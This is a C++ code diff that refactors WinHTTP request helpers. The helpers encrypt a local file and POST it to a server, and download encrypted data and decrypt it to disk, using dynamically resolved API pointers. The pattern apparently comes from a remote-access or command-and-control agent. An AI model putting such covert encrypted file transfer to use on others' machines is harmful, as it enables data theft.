@@ -39,7 +39,6 @@ namespace System::Http
 		BOOL bResult = FALSE;
 		HINTERNET hRequest = NULL;
 		DWORD dwSecFlags = 0;
-		// DWORD dwDataLength = 0;
 		DWORD dwDataWrite = 0;
 		DWORD dwStatusCode = 0;
 		DWORD dwStatusCodeSize = sizeof(dwStatusCode);
@@ -86,17 +85,24 @@ namespace System::Http
 			dwDataLength,
 			0
 		);
-		if (!bResult) {
+		if (!bResult)
+		{
 			return {FALSE, hRequest, 0};
 		}
 
-		if (lpData) {
+		if (lpData)
+		{
 			bResult = pProcs->lpWinHttpWriteData(
 				hRequest,
 				lpData,
 				dwDataLength,
 				&dwDataWrite
 			);
+
+			if (!bResult)
+			{
+				return {FALSE, hRequest, 0};
+			}
 		}
 
 		bResult = pProcs->lpWinHttpReceiveResponse(hRequest, NULL);
@@ -247,18 +253,19 @@ namespace System::Http
 		}
 
 		// Read file
-		std::vector<BYTE> bytes = ReadResponseBytes(pProcs, resp.hRequest);
-		if (bytes.size() == 0)
+		std::wstring wEnc = ReadResponseText(pProcs, resp.hRequest);
+		if (wEnc.length() == 0)
 		{
+			CloseHandle(hFile);
 			return FALSE;
 		}
 
 		// Decrypt data
-		std::vector<BYTE> decBytes = Crypt::DecryptData(Utils::Convert::VecByteToString(bytes));
+		std::vector<BYTE> bytes = Crypt::Decrypt(wEnc);
 		
 		// Write data to file
 		DWORD dwWritten;
-		if (!WriteFile(hFile, decBytes.data(), decBytes.size(), &dwWritten, NULL))
+		if (!WriteFile(hFile, bytes.data(), bytes.size(), &dwWritten, NULL))
 		{
 			CloseHandle(hFile);
 			return FALSE;
@@ -281,7 +288,8 @@ namespace System::Http
         // Read a local file.
         std::vector<BYTE> bytes = System::Fs::ReadBytesFromFile(wSrc);
         // Encrypt the data
-        std::string encData = Crypt::EncryptData(bytes);
+        std::wstring wEnc = Crypt::Encrypt(bytes);
+		std::string sEnc = Utils::Convert::UTF8Encode(wEnc);
 
         System::Http::WinHttpResponse resp = System::Http::SendRequest(
             pProcs,
@@ -291,8 +299,8 @@ namespace System::Http
             lpPath,
             L"POST",
             lpHeaders,
-            (LPVOID)encData.c_str(),
-            (DWORD)strlen(encData.c_str())
+            (LPVOID)sEnc.c_str(),
+            (DWORD)strlen(sEnc.c_str())
         );
         if (!resp.bResult || resp.dwStatusCode != 200)
         {
